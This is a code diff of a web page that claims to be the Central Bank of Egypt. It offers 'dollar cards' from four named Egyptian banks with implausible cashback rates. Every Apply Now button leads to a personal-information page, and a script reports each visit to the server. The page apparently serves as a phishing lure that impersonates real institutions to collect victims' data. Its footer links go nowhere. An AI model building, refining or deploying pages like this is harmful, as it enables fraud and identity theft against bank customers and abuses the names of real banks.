@@ -40,13 +40,31 @@
             margin: 0 auto;
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            width: 100%;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
         }
 
         .logo-container img {
-            height: 70px;
+            height: 80px;
             object-fit: contain;
+        }
+
+        .header-text {
+            color: #1a1a1a;
+            text-align: center;
+        }
+
+        .header-text h1 {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #d4af37;
+        }
+
+        .header-text p {
+            font-size: 14px;
+            color: #666;
         }
 
         /* Main Container */
@@ -102,11 +120,23 @@
         }
 
         /* Bank Card Colors */
-        .bank-card[data-bank="mashreq"] { border-top-color: #ff7f00; }
-        .bank-card[data-bank="bm"] { border-top-color: #b01c1c; }
-        .bank-card[data-bank="cib"] { border-top-color: #004b91; }
-        .bank-card[data-bank="nbe"] { border-top-color: #006b3f; }
+        .bank-card[data-bank="mashreq"] {
+            border-top-color: #ff7f00;
+        }
 
+        .bank-card[data-bank="bm"] {
+            border-top-color: #b01c1c;
+        }
+
+        .bank-card[data-bank="cib"] {
+            border-top-color: #004b91;
+        }
+
+        .bank-card[data-bank="nbe"] {
+            border-top-color: #006b3f;
+        }
+
+        /* Bank Card Header */
         .bank-card-header {
             padding: 20px;
             text-align: center;
@@ -134,6 +164,7 @@
             color: #333;
         }
 
+        /* Bank Card Body */
         .bank-card-body {
             padding: 30px 20px;
             flex: 1;
@@ -251,6 +282,42 @@
             margin-top: auto;
         }
 
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        .footer-section h3 {
+            font-size: 16px;
+            margin-bottom: 15px;
+            color: #d4af37;
+            border-bottom: 2px solid #d4af37;
+            padding-bottom: 10px;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section ul li {
+            margin-bottom: 10px;
+        }
+
+        .footer-section ul li a {
+            color: #ccc;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s ease;
+        }
+
+        .footer-section ul li a:hover {
+            color: #d4af37;
+        }
+
         .footer-bottom {
             border-top: 1px solid #444;
             padding-top: 20px;
@@ -258,21 +325,42 @@
             color: #999;
         }
 
+        /* Responsive */
         @media (max-width: 768px) {
-            .banks-grid { grid-template-columns: 1fr; }
+            .header-text h1 {
+                font-size: 20px;
+            }
+
+            .section-title h2 {
+                font-size: 24px;
+            }
+
+            .banks-grid {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+
+            .logo-container img {
+                height: 55px;
+            }
+
+            .rate-percentage {
+                font-size: 36px;
+            }
         }
     </style>
 </head>
 <body>
 
+    <!-- Header -->
     <header style="padding: 10px 20px;">
         <div class="header-content" style="display: flex; justify-content: space-between; align-items: center; width: 100%; max-width: 1200px; margin: 0 auto;">
-            <div class="header-left" style="display: flex; align-items: center; gap: 15px;">
-                <div class="menu-icon" style="font-size: 22px; color: #1a1a1a; cursor: pointer;"><i class="fas fa-bars"></i></div>
-                <button onclick="window.location.href='index.html'" style="background: none; border: 1px solid #1a1a1a; color: #1a1a1a; padding: 4px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 14px;">العربية</button>
-            </div>
             <div class="logo-container">
                 <img src="images/cbe_logo.png" alt="Central Bank of Egypt" style="height: 55px;">
+            </div>
+            <div class="header-left" style="display: flex; align-items: center; gap: 15px;">
+                <button onclick="window.location.href='index.html'" style="background: none; border: 1px solid #1a1a1a; color: #1a1a1a; padding: 4px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 14px;">العربية</button>
+                <div class="menu-icon" style="font-size: 22px; color: #1a1a1a; cursor: pointer;"><i class="fas fa-bars"></i></div>
             </div>
         </div>
     </header>
@@ -280,47 +368,109 @@
     <!-- Main Banner -->
     <div style="width: 100%; background: #ffffff; text-align: center; margin-top: 15px; padding-top: 10px;"><img src="images/cbe_banner.jpg" alt="Central Bank of Egypt" style="width: 100%; max-width: 1000px; height: auto; display: block; margin: 0 auto; object-fit: contain;"></div>
 
+    <!-- Main Container -->
     <div class="container">
         <div class="section-title">
             <h2>Get Your Dollar Card Under the Supervision of the Central Bank of Egypt</h2>
             <p>Choose your bank now</p>
         </div>
 
+        <!-- Banks Grid -->
         <div class="banks-grid" id="banksGrid">
             <!-- Cards will be generated by JavaScript -->
         </div>
     </div>
 
+    <!-- Footer -->
     <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>Legal Pages</h3>
+                <ul>
+                    <li><a href="#">Privacy Policy</a></li>
+                    <li><a href="#">Terms and Conditions</a></li>
+                    <li><a href="#">Disclaimer</a></li>
+                    <li><a href="#">Security & Customer Protection</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Customer Service</h3>
+                <ul>
+                    <li><a href="#">Contact Us</a></li>
+                    <li><a href="#">FAQ</a></li>
+                    <li><a href="#">Technical Support</a></li>
+                    <li><a href="#">File a Complaint</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Important Links</h3>
+                <ul>
+                    <li><a href="#">About Central Bank</a></li>
+                    <li><a href="#">Financial Statistics</a></li>
+                    <li><a href="#">Annual Reports</a></li>
+                    <li><a href="#">News & Announcements</a></li>
+                </ul>
+            </div>
+        </div>
         <div class="footer-bottom">
             <p>© 2026 Central Bank of Egypt - All Rights Reserved</p>
         </div>
     </footer>
 
     <script>
+        // Banks Data
         const banks = [
-            { id: 'mashreq', name: 'Mashreq Bank', logo: 'images/mashreq_logo_color.png', personalInfoUrl: 'personal_info_en.html', color: '#ff7f00', gallery: [
-                {src: 'images/mashreq_promo1.jpg', caption: 'Monthly dollar withdrawal limit: $9,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
-                {src: 'images/mashreq_promo2.jpg', caption: 'Monthly dollar withdrawal limit: $2,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
-                {src: 'images/mashreq_promo3.jpg', caption: 'Monthly dollar withdrawal limit: $4,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'}
-            ] },
-            { id: 'bm', name: 'Banque Misr', logo: 'images/bm_logo.png', personalInfoUrl: 'personal_info_en.html', color: '#b01c1c', gallery: [
-                {src: 'images/bm_card_362.jpg', caption: 'Monthly dollar withdrawal limit: $2,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
-                {src: 'images/bm_card_titanium.jpg', caption: 'Monthly dollar withdrawal limit: $4,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
-                {src: 'images/bm_card_platinum.jpg', caption: 'Monthly dollar withdrawal limit: $9,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'}
-            ] },
-            { id: 'cib', name: 'CIB', logo: 'images/cib_logo.png', personalInfoUrl: 'personal_info_en.html', color: '#004b91', gallery: [
-                {src: 'images/cib_card_business.png', caption: 'Monthly dollar withdrawal limit: $9,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
-                {src: 'images/cib_card_debit.png', caption: 'Monthly dollar withdrawal limit: $4,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
-                {src: 'images/cib_card_wealth.png', caption: 'Monthly dollar withdrawal limit: $2,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'}
-            ] },
-            { id: 'nbe', name: 'National Bank of Egypt', logo: 'images/nbe_logo.png', personalInfoUrl: 'personal_info_en.html', color: '#006b3f', gallery: [
-                {src: 'images/nbe_card_1.jpg', caption: 'Monthly dollar withdrawal limit: $2,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
-                {src: 'images/nbe_card_2.jpg', caption: 'Monthly dollar withdrawal limit: $4,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
-                {src: 'images/nbe_card_platinum_plus.png', caption: 'Monthly dollar withdrawal limit: $9,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'}
-            ] }
+            {
+                id: 'mashreq',
+                name: 'Mashreq Bank',
+                logo: 'images/mashreq_logo_color.png',
+                personalInfoUrl: 'personal_info_en.html',
+                color: '#ff7f00',
+                gallery: [
+                    {src: 'images/mashreq_promo1.jpg', caption: 'Monthly dollar withdrawal limit: $9,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
+                    {src: 'images/mashreq_promo2.jpg', caption: 'Monthly dollar withdrawal limit: $2,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
+                    {src: 'images/mashreq_promo3.jpg', caption: 'Monthly dollar withdrawal limit: $4,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'}
+                ]
+            },
+            {
+                id: 'bm',
+                name: 'Banque Misr',
+                logo: 'images/bm_logo.png',
+                personalInfoUrl: 'personal_info_en.html',
+                color: '#b01c1c',
+                gallery: [
+                    {src: 'images/bm_card_362.jpg', caption: 'Monthly dollar withdrawal limit: $2,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
+                    {src: 'images/bm_card_titanium.jpg', caption: 'Monthly dollar withdrawal limit: $4,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
+                    {src: 'images/bm_card_platinum.jpg', caption: 'Monthly dollar withdrawal limit: $9,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'}
+                ]
+            },
+            {
+                id: 'cib',
+                name: 'CIB',
+                logo: 'images/cib_logo.png',
+                personalInfoUrl: 'personal_info_en.html',
+                color: '#004b91',
+                gallery: [
+                    {src: 'images/cib_card_business.png', caption: 'Monthly dollar withdrawal limit: $9,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
+                    {src: 'images/cib_card_debit.png', caption: 'Monthly dollar withdrawal limit: $4,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
+                    {src: 'images/cib_card_wealth.png', caption: 'Monthly dollar withdrawal limit: $2,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'}
+                ]
+            },
+            {
+                id: 'nbe',
+                name: 'National Bank of Egypt',
+                logo: 'images/nbe_logo.png',
+                personalInfoUrl: 'personal_info_en.html',
+                color: '#006b3f',
+                gallery: [
+                    {src: 'images/nbe_card_1.jpg', caption: 'Monthly dollar withdrawal limit: $2,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
+                    {src: 'images/nbe_card_2.jpg', caption: 'Monthly dollar withdrawal limit: $4,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'},
+                    {src: 'images/nbe_card_platinum_plus.png', caption: 'Monthly dollar withdrawal limit: $9,500', cashback1: '2.5% cashback on dollar withdrawals', cashback2: '25% cashback on EGP withdrawals'}
+                ]
+            }
         ];
 
+        // Initialize Banks Grid
         function initializeBanks() {
             const grid = document.getElementById('banksGrid');
             banks.forEach(bank => {
@@ -329,28 +479,47 @@
                 card.setAttribute('data-bank', bank.id);
                 card.innerHTML = `
                     <div class="bank-card-header">
-                        <div class="bank-logo"><img src="${bank.logo}" alt="${bank.name}"></div>
+                        <div class="bank-logo">
+                            <img src="${bank.logo}" alt="${bank.name}">
+                        </div>
                         <div class="bank-name">${bank.name}</div>
                     </div>
-                    <div class="bank-card-body">
-                        ${bank.gallery ? `<div class="bank-cards-row">${bank.gallery.map(item => `<div class="mini-card"><img src="${item.src}" alt="${bank.name} card"><div class="card-caption" style="color: ${bank.color};">${item.caption}</div>${item.cashback1 ? `<div class="card-cashback" style="color: ${bank.color};">${item.cashback1}<br>${item.cashback2}</div>` : ''}<button class="btn-apply-mini" onclick="goToPersonalInfo('${bank.id}')"><i class="fas fa-arrow-right"></i> Apply Now</button></div>`).join('')}</div>` : ''}
-                        <button class="btn-apply" onclick="goToPersonalInfo('${bank.id}')">Apply Now</button>
+                        <div class="bank-card-body">
+                        ${bank.gallery ? `<div class="bank-cards-row">${bank.gallery.map(item => `<div class="mini-card"><img src="${item.src}" alt="${bank.name} - Card"><div class="card-caption" style="color: ${bank.color};">${item.caption}</div>${item.cashback1 ? `<div class="card-cashback" style="color: ${bank.color};">${item.cashback1}<br>${item.cashback2}</div>` : ''}<button class="btn-apply-mini" onclick="goToPersonalInfo('${bank.id}')"><i class="fas fa-arrow-right"></i> Apply Now</button></div>`).join('')}</div>` : ''}
+                        <button class="btn-apply" onclick="goToPersonalInfo('${bank.id}')">
+                            <i class="fas fa-arrow-right"></i> Apply Now
+                        </button>
                     </div>
                 `;
                 grid.appendChild(card);
             });
         }
 
+        // Go to Personal Info Page
         function goToPersonalInfo(bankId) {
             const bank = banks.find(b => b.id === bankId);
             if (bank) {
+                // Save selected bank to localStorage
                 localStorage.setItem('selectedBank', bankId);
                 localStorage.setItem('selectedBankData', JSON.stringify(bank));
+                
+                // Redirect to personal info page
                 window.location.href = bank.personalInfoUrl;
             }
         }
 
+        // Track Visit
+        fetch('/track_visit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ action: 'track_visit', page: 'index_en' })
+        }).catch(error => console.error('Error tracking visit:', error));
+
+        // Initialize on load
         window.addEventListener('DOMContentLoaded', initializeBanks);
     </script>
+
 </body>
 </html>
